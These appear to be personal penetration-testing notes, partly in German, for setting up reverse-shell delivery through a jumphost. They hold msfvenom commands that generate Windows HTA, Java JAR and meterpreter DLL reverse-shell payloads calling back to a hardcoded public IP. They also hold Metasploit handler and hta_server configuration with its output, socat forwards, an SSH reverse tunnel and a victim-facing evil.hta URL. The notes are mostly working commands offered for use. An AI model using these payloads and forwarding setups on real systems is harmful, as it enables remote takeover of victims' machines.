# Prepair
```
msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=178.254.30.161 LPORT=443 -f hta-psh
msfvenom -a x86 -p java/shell_reverse_tcp LHOST=178.254.30.161 LPORT=443 -o foo.jar -f jar
msfvenom -p windows/meterpreter/reverse_tcp LHOST=178.254.30.161 LPORT=443 -f dll -o pentestlab.dll
```

## Multihandlet payload
```
use exploit/multi/handler
set payload java/shell/reverse_tcp
set LHOST localLaptop
set LPORT 4444
set VERBOSE TRUE
run
```

## on Laptop where Multihandler is launched
```
msf > use exploit/windows/misc/hta_server
      set URIPATH evil.hta
      set LPORT 4444
      set VERBOSE TRUE
      run
[*] Exploit running as background job.
[*] Started reverse TCP handler on 192.168.178.27:4444
[*] Using URL: http://0.0.0.0:8080/evil.hta
[*] Local IP: http://192.168.178.27:8080/evil.hta
[*] Server started.
```

## Muss noch ein zweiten socat setzen der incoming powershell rev an :4444 weiterreicht ???
port forward on jumphost
```
root@jumphost:~# socat -d -d -d tcp4-listen:80,reuseaddr,fork tcp4:127.0.0.1:1111
root@jumphost:~# socat -d -d -d tcp4-listen:4444,reuseaddr,fork tcp4:127.0.0.1:2222
```

## port forward on jumphost - only connections from range allowed
```
root@jumphost:~# socat -d -d -d tcp4-listen:80,reuseaddr,fork,range=193.28.64.18/32 tcp4:127.0.0.1:1111
root@jumphost:~# socat -d -d -d tcp4-listen:80,reuseaddr,fork,range=84.170.159.180/32 tcp4:127.0.0.1:1111
user@Local$ ssh -NfR 1111:127.0.0.1:8080 root@178.254.30.161 # Remote port forward to jumphost

root@jumphost:~# netstat -tulpen
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          1347484488  4765/socat
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          1312344026  227/sshd
tcp        0      0 127.0.0.1:1111          0.0.0.0:*               LISTEN      1000       1347484421  4764/sshd
```

## victim accsses hta on jumphost
```
http://178.254.30.161/evil.hta
```

## simulated victim rev Shell incoming
```
echo "remote c" | nc 178.254.30.161 80
```

## Spaawning
spawn multihandler 4444 ->  connect multihandlet 2 ssh port 127.0.0.1:5555
user@Local$ socat -d -d  TCP:localhost:4444 TCP:localhost:5555

tags: [reverse shell] meterpreter jumphost ssh
